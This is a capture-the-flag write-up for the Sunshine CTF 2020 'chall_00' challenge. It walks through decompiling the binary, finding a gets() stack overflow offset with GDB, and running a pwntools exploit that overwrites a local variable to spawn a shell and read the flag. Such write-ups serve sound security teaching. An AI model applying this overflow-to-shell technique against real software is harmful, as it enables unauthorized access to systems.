# Sunshine CTF 2020 Speedrun
This repo contains my solutions for the Sunshine CTF speedrun challenges. The binary files are provided by https://sunshinectf.org/.

## chall_00
---
The first step is to decompile the binary to understand how it works.

Ghidra outputs:
```c

void main(void)
{
  char local_48 [56];
  int local_10;
  int local_c;
  
  puts("This is the only one");
  gets(local_48);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}
```

There are three variables initialized that we don't control the values of. If `local_c` or `local_10` somehow become equal to the constant `0xfacade`, we will gain shell access.

The man page for `gets` has this to say about it:
> GETS

> NAME

>        gets - get a string from standard input (DEPRECATED)

> SYNOPSIS

>        #include <stdio.h>

>        char *gets(char *s);

> DESCRIPTION

>        Never use this function.

>        gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).

A buffer overflow should be possible. We should be able to write enough characters into `gets` that it overflows into the memory reserved for `local_c` and `local_10`.

We can run the program with a very identifiable input of `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ`, and then use a debugger to break immediately before the first comparison to see which letter is being compared with the `0xfacade` constant. This will show us how many throwaway characters we need before typing the constant.

GDB can be used for debugging. Disassembling the binary provides:
```assembly
(gdb) disassemble main
Dump of assembler code for function main:
   0x00005555555546ca <+0>:     push   %rbp
   0x00005555555546cb <+1>:     mov    %rsp,%rbp
   0x00005555555546ce <+4>:     sub    $0x40,%rsp
   0x00005555555546d2 <+8>:     lea    0xcb(%rip),%rdi        # 0x5555555547a4
   0x00005555555546d9 <+15>:    callq  0x555555554580 <puts@plt>
   0x00005555555546de <+20>:    lea    -0x40(%rbp),%rax
   0x00005555555546e2 <+24>:    mov    %rax,%rdi
   0x00005555555546e5 <+27>:    mov    $0x0,%eax
   0x00005555555546ea <+32>:    callq  0x5555555545a0 <gets@plt>
   0x00005555555546ef <+37>:    cmpl   $0xfacade,-0x4(%rbp)
   0x00005555555546f6 <+44>:    jne    0x555555554704 <main+58>
   0x00005555555546f8 <+46>:    lea    0xba(%rip),%rdi        # 0x5555555547b9
   0x00005555555546ff <+53>:    callq  0x555555554590 <system@plt>
   0x0000555555554704 <+58>:    cmpl   $0xfacade,-0x8(%rbp)
   0x000055555555470b <+65>:    jne    0x555555554719 <main+79>
   0x000055555555470d <+67>:    lea    0xa5(%rip),%rdi        # 0x5555555547b9
   0x0000555555554714 <+74>:    callq  0x555555554590 <system@plt>
   0x0000555555554719 <+79>:    nop
   0x000055555555471a <+80>:    leaveq
   0x000055555555471b <+81>:    retq
End of assembler dump.
```

Let's insert a breakpoint right before the comparison:
```assembly
(gdb) break *(main+58)
Breakpoint 1 at 0x555555554704
```

Re running the program, we can print the value being compared with `0xfacade` ($rbp - 0x4).
```
(gdb) r
Starting program: /mnt/c/Users/meraxes/dev/ctf/sunshinectf2020/chall_00
This is the only one
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Breakpoint 1, 0x0000555555554704 in main ()
(gdb) p (char*) $rbp - 0x4
$1 = 0x7fffffffe24c "PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```

This means that we would need to put the constant into our input as soon as the "P" starts in the string. It makes sense that this value would be at "P". Recall from the Ghidra output above, `local_48` is a `char` array with 56 members. This puts us at 56 bytes needed. `local_10` is an `int`, which requires 4 bytes of space. In total, we need 60 bytes before we reach the memory for `local_c`.  There are 60 character taking up 60 bytes in the letters A through O.

With all the information here, we can write a program to run the exploit end to end.

```python
#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_00')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30000)
else:
    io = process(context.binary.path)
    
print(io.recvline())

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO'
payload = p32(0xfacade)

io.sendline(flat(buffer, payload))
io.interactive()
```

Note that we needed to use a pack function on the constant to send. The binary was made on a little endian system, and the bytes need to be sent in reverse.

Running the program gives us shell access on Sunshine's server:
```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshinectf2020$ ./chall_00.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshinectf2020/chall_00'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30000: Done
b'This is the only one\n'
Sending:  b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO\xde\xca\xfa\x00'
[*] Switching to interactive mode
$ ls
chall_00
flag.txt
$ cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
$ 
```
